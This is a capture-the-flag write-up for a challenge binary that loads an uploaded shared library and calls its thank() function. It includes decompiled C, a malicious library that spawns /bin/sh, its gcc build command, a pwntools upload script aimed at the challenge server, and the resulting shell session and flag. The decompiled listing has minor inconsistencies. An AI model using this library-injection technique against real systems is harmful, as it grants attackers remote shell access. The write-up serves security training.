# thank

This program only provides an executable called "thank".

Decompiling it was rather simple with Ghidra. Several functions had the sole purpose of calling some other libc function. Here's my decompiled and simplified version of their code:
(All functions which just called another function have been changed to that other function)

```c
void take_file(char *file_name) {
  void* dll;
  long thank;
  char dll_name[40];

  snprintf(dll_name,0x20,"%s",file_name);
  dll = dlopen(dll_name,1);
  if (dll != NULL) {
    if (dlsym(dll,"thank")) {
      (*(code *)thank)();
      return;
    }
  }
  puts("Thanks for your file!");
}

void set_dll_name(char *ptr,int len,char *dll_name,int size) {
  char *end;
  int sum;

  sum = 0;
  end = ptr + len;
  while (ptr < end) {
    sum += *ptr;
    ptr++;
  } while (ptr != end);

  snprintf(dll_name,size,"/tmp/%x.so",sum);
  return;
}

void main() {
  int len;
  char *ptr, input[40];
  FILE *stream;

  len = get_file_size();
  ptr = (void *)malloc(len);
  fread(ptr,len);
  set_dll_name(ptr,len,input,0x20);
  stream = fopen(input);
  fwrite(ptr,len,stream);
  fclose(stream);
  free(ptr);
  take_file(input);
  remove(input);
}
```

From this decompiled code, it's rather clear to see that if you provide a shared library with a thank() function, it will call that.

So I wrote the following `thank.c`:
```
#include <stdlib.h>

void thank() {
    system("/bin/sh");
}
```

And compiled it with:
```
gcc -shared -o libthank.so -fPIC thank.c
```

Then used this Python program to send it:
```python
import pwn

io = pwn.remote("challs.pwnoh.io",13373)

with open("./libthank.so", "rb") as f:
    so_contents = f.read()

so_size = len(so_contents)
io.recvuntil(b'What is the size of your file (in bytes)? ')
io.sendline(str(so_size).encode())

io.recvuntil(b'Send your file!\n')
io.sendline(so_contents)

io.interactive()
```

Which gave the following:
```
# python3 exploit.py SILENT
$ ls
flag.txt
run
$ cat flag.txt
bctf{7h4nk_y0ur_10c41_c0mpu73r_70d4y}
```

Giving the flag `bctf{7h4nk_y0ur_10c41_c0mpu73r_70d4y}`



